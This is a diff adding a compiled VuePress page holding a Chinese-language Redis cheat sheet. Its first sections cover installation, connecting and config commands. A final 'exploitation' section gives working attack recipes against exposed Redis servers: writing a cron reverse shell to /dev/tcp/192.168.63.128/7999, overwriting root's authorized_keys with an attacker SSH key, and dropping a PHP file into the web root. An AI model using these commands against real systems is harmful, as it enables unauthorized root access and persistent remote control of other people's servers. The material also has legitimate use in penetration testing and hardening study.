@@ -1,0 +1,27 @@
+import{_ as e,n as t,p as l,q as o,s as a,R as s,t as c,Y as p}from"./framework-cfcd8ab0.js";const i={},r=a("h2",{id:"安装",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#安装","aria-hidden":"true"},"#"),s(" 安装")],-1),d=a("p",null,"安装包：",-1),h={href:"https://github.com/tporadowski/redis/releases",target:"_blank",rel:"noopener noreferrer"},u=p(`<h2 id="运行" tabindex="-1"><a class="header-anchor" href="#运行" aria-hidden="true">#</a> 运行</h2><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>redis-server.exe redis.windows.conf <span class="token comment"># 开启 redis 服务。</span>
+redis-cli.exe <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token comment"># 连接 redis。</span>
+</code></pre></div><h2 id="配置" tabindex="-1"><a class="header-anchor" href="#配置" aria-hidden="true">#</a> 配置</h2><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>config get config_name <span class="token comment"># 格式。</span>
+config get * <span class="token comment"># 获取全部配置。</span>
+config <span class="token builtin class-name">set</span> config_name config_value <span class="token comment"># 设置配置项。</span>
+</code></pre></div><h2 id="命令" tabindex="-1"><a class="header-anchor" href="#命令" aria-hidden="true">#</a> 命令</h2><ul><li>连接</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>redis-cli <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1
+</code></pre></div><ul><li>查看信息</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span>info
+</code></pre></div><ul><li>设置变量</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">set</span> x <span class="token string">&quot;test&quot;</span> <span class="token comment"># 将变量 x 设置成 test。</span>
+</code></pre></div><ul><li>删除数据库</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span>flushall
+</code></pre></div><ul><li>查看所有键</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>KEYS *
+</code></pre></div><ul><li>获取默认目录</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>CONFIG GET <span class="token function">dir</span>
+</code></pre></div><ul><li>获取 rdb 文件名</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>CONFIG GET dbfilename
+</code></pre></div><h2 id="利用" tabindex="-1"><a class="header-anchor" href="#利用" aria-hidden="true">#</a> 利用</h2><ul><li>计划任务</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>redis-cli <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1
+<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> x <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1<span class="token entity" title="\\n">\\n</span>&quot;</span>
+<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/
+<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> dbfilename root
+<span class="token operator">&gt;</span> save
+</code></pre></div><ul><li>替换公钥</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token comment"># 生成公钥。</span>
+<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/
+<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> dbfilename authorized_keys
+<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> x <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>ssh-rsa {{rsa_key}}<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&quot;</span>
+<span class="token operator">&gt;</span> save
+</code></pre></div><ul><li>写入木马</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/
+<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> dbfilename shell.php
+<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> x <span class="token string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>
+<span class="token operator">&gt;</span> save
+</code></pre></div>`,26);function g(k,b){const n=t("ExternalLinkIcon");return l(),o("div",null,[r,d,a("p",null,[a("a",h,[s("https://github.com/tporadowski/redis/releases"),c(n)])]),u])}const v=e(i,[["render",g],["__file","Redis.html.vue"]]);export{v as default};
